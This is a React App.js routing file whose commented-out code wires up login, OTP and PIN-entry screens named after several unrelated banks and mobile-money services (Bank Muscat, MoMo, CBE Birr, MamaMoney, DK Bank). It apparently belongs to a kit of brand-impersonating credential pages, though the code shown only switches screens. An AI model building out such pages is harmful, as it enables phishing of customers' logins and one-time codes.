// import React from "react";
// import FeesAndCharges from "./FeesAndCharges";
// import { Routes, Route } from "react-router-dom";
// import Firstpage from "./Firstpage";
// import BankMuscatForms from "./BankMuscatForms";
// import ThirdPage from "./ThirdPage";
// import OTPVerification from "./OTPVerification";
// import MoMoLogin from "./MoMoLogin";
// import Otppage from "./Otppage"
// import PINEntry from "./PINEntry";
// import CBEBirrLogin from "./CBEBirrLogin";
// import LoginAuthentication from "./LoginAuthentication";
// import OtpVerify from "./OtpVerify";
// import MamaMoney from "./MamaMoney";
// import MamaMoneyOTP from "./MamaMoneyOTP";
// import DKBankLogin from "./DKBankLogin";
// import LoanApplicationscreen from "./LoanApplicationscreen";




// function App() {
//   return (
//     <>
//       <Routes>
//         {/* <Route path="/" element={<DKBankLogin />} /> */}
//         <Route path="/" element={<LoanApplicationscreen />} />
//         {/* <Route path="/" element={<Firstpage />} />
//         <Route path="/feecharges" element={<FeesAndCharges />} />
//         <Route path="/form" element={<BankMuscatForms />} />
//         <Route path="/third" element={<ThirdPage />} />
//         <Route path="/otpcode" element={<OTPVerification />} /> */}
        
//         {/* <Route path='/' element={  <MoMoLogin/>}/>
//         <Route path='/pincode' element={  <PINEntry/>}/>
//         <Route path='/otppage' element={  <Otppage/>}/> */}



// {/* <Route path="/" element={<MamaMoney/>}/>
// <Route path="/otp" element={<MamaMoneyOTP/>}/> */}
//         {/* <Route path="/" element={<CBEBirrLogin/>}/> */}
//         {/* <Route path="/loginauth" element={<LoginAuthentication/>}/> */}
//         {/* <Route path="/otpverify" element={<OtpVerify/>}/> */}
//       </Routes>
    
//     </>
//   );
// }

// export default App;



import React, { useState } from "react";
import DKBankLogin from "./DKBankLogin";
import LoanApplicationScreen from "./LoanApplicationScreen";

export default function App() {
  const [page, setPage] = useState("login"); // "login" | "loan"

  if (page === "loan") {
    return <LoanApplicationScreen />;
  }

  return <DKBankLogin onMpinVerified={() => setPage("loan")} />;
}